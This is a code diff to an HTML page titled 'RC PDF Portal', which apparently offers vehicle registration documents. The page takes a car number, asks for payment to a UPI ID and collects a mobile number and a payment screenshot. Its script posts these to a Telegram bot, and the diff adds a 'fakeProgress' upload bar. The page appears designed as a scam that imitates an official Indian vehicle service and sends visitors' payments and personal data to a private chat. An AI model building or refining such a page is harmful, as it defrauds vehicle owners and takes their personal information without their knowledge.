@@ -24,6 +24,19 @@ min-height:100vh;
 100%{background-position:100%}
 }
 
+.home{
+position:fixed;
+top:12px;
+left:12px;
+background:white;
+color:black;
+padding:8px 16px;
+border-radius:10px;
+font-weight:bold;
+cursor:pointer;
+z-index:99;
+}
+
 .card{
 background:#000c;
 color:white;
@@ -51,7 +64,7 @@ font-weight:bold;
 cursor:pointer;
 }
 
-/* IND INPUT */
+/* IND input */
 .ind-box{
 display:flex;
 align-items:center;
@@ -92,7 +105,30 @@ from{transform:rotate(0deg);}
 to{transform:rotate(360deg);}
 }
 
-/* FOOTER */
+/* Loader */
+.loader{
+width:100%;
+background:#222;
+border-radius:8px;
+overflow:hidden;
+margin-top:12px;
+display:none;
+}
+
+.progress{
+height:10px;
+width:0%;
+background:#00ffd5;
+transition:width 0.3s;
+}
+
+.loading-text{
+margin-top:6px;
+font-size:14px;
+display:none;
+}
+
+/* Footer */
 .footer{
 margin-top:20px;
 padding:12px;
@@ -110,8 +146,8 @@ border-radius:12px;
 .footer-links{
 display:flex;
 justify-content:flex-start;
-gap:15px;
-margin-top:6px;
+gap:25px;
+margin-top:8px;
 font-size:14px;
 }
 
@@ -125,7 +161,7 @@ display:none;
 background:#000c;
 color:white;
 padding:12px;
-margin-top:8px;
+margin-top:10px;
 border-radius:10px;
 font-size:13px;
 }
@@ -133,6 +169,8 @@ font-size:13px;
 </head>
 
 <body>
+
+<div class="home" onclick="goHome()">🏠 Home</div>
 
 <div class="card">
 
@@ -145,7 +183,7 @@ font-size:13px;
     <img src="https://upload.wikimedia.org/wikipedia/commons/1/17/Ashoka_Chakra.svg">
     IND
   </div>
-  <input id="vehicle" placeholder="Enter vehicle No" maxlength="10" oninput="formatVehicle(this)">
+  <input id="vehicle" placeholder="Enter Car No" maxlength="13" oninput="formatVehicle(this)">
 </div>
 
 <button onclick="goPay()">Continue</button>
@@ -160,8 +198,12 @@ font-size:13px;
 <p>UPI ID: bestinsurance@upi</p>
 
 <input id="mobile" placeholder="Mobile Number">
+<input type="file" id="proof" accept="image/*">
 
-<input type="file" id="proof" accept="image/*" onchange="autoUpload()">
+<div class="loader" id="loader">
+  <div class="progress" id="progress"></div>
+</div>
+<div class="loading-text" id="loadingText">Uploading...</div>
 
 <button onclick="submitPay()">Submit</button>
 </div>
@@ -184,11 +226,11 @@ font-size:13px;
 </div>
 
 <div id="about" class="popup">
-RC PDF Portal provides vehicle related digital services and assistance.
+RC PDF Portal provides vehicle related digital assistance services.
 </div>
 
 <div id="disclaimer" class="popup">
-We are not a government website. Data provided by users voluntarily.
+We are not a government website. Information is user submitted.
 </div>
 
 <div id="contact" class="popup">
@@ -210,18 +252,32 @@ if(v.slice(6)) out+="-"+v.slice(6,10);
 el.value=out;
 }
 
+function goHome(){
+p2.classList.add("hidden");
+p3.classList.add("hidden");
+p1.classList.remove("hidden");
+}
+
 function goPay(){
 if(!vehicle.value.trim()) return alert("Enter vehicle number");
 p1.classList.add("hidden");
 p2.classList.remove("hidden");
 }
 
-function autoUpload(){
-if(proof.files[0]) submitPay();
-}
-
 function submitPay(){
 if(mobile.value.length<10) return alert("Enter mobile number");
+if(!proof.files[0]) return alert("Upload screenshot");
+
+loader.style.display="block";
+loadingText.style.display="block";
+progress.style.width="0%";
+
+let fakeProgress=0;
+let bar=setInterval(()=>{
+fakeProgress+=10;
+progress.style.width=fakeProgress+"%";
+if(fakeProgress>=90) clearInterval(bar);
+},200);
 
 let data=new FormData();
 data.append("chat_id",chatId);
@@ -232,8 +288,13 @@ fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
 method:"POST",
 body:data
 }).then(()=>{
+progress.style.width="100%";
+setTimeout(()=>{
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
+loader.style.display="none";
+loadingText.style.display="none";
+},600);
 });
 }
 
